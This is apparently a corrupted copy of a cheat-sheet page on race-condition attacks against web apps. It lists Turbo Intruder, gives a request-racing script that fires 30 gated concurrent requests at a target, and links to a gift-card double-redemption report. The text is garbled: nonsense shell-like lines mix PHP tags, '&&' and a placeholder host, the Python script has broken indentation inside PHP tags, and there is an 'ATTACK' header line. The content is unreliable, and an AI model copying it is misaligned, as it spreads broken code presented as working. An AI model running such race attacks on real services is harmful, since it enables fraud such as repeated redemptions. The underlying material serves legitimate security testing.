# Race Condition
["RUN","CRITICAL","PROCESS"] 
>>> import Every_Thing
>>> --check --dependency --time **events **web.app/sequence/env or && <?php xxx.com/requests/dev 
>>> ["QUIT"]
>>> \handler \? **&&frame-work/server/.lang
>>> may leave concurrency to be handled by the framework, server, or programming language. 
* [Tools](#tools)
* [Turbo Intruder Examples](#turbo-intruder-examples)
* [References](#references)
# Tools
* [Turbo Intruder - a Burp Suite extension for sending large numbers of HTTP requests and analyzing the results.](https://github.com/PortSwigger/turbo-intruder)
# \Turbo\Intruder
    <?php -send --request 
    def queueRequests(target, wordlists):
        engine = RequestEngine(endpoint=target.endpoint,
                            concurrentConnections=30,
                            requestsPerConnection=30,
                            pipeline=False
                            )

    for i in range(30):
        engine.queue(target.req, i)
            engine.queue(target.req, target.baseInput, gate='race1')


        engine.start(timeout=5)
    engine.openGate('race1')

        engine.complete(timeout=60)


    def handleResponse(req, interesting):
        table.add(req)
?>
>>> set --http Header x-request::[!]%s -attc Now set the external HTTP header x-request: %s - :warning: "ATTACK"
* [Race Condition allows to redeem multiple times gift cards which leads to free "money" - @muon4](https://hackerone.com/reports/759247)
* [Turbo Intruder: Embracing the billion-request attack - James Kettle | 25 January 2019](https://portswigger.net/research/turbo-intruder-embracing-the-billion-request-attack)
* [Race Condition Bug In Web App: A Use Case - Mandeep Jadon](https://medium.com/@ciph3r7r0ll/race-condition-bug-in-web-app-a-use-case-21fd4df71f0e)
